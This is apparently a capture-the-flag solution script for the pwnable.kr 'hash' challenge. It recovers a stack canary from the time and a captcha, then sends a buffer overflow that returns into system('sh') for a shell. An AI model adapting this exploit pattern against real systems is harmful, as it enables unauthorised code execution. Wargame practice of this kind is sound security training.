#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from os import popen
from time import time, sleep
from base64 import b64encode as b64
import sys
#  context.log_level = "debug"

if sys.argv[1] == "r":
    io = remote("pwnable.kr", 9002)
else:
    io = process("./hash")

io.recvuntil(" : ")
elf = ELF("./hash")

captcha = io.recvuntil("\n", drop = True)
io.sendline(captcha)

t = int(time())
canary = '0x' + popen('./getCanary %s %s' % (str(t), captcha)).read().strip()
canary = int(canary, 16)

payload = cyclic(512) + p32(canary) + cyclic(12) + p32(elf.symbols["system"]) + p32(0xdeadbeef) + p32(next(elf.search("sh")))
io.sendlineafter("me!\n", b64(payload))

io.interactive()
io.close()
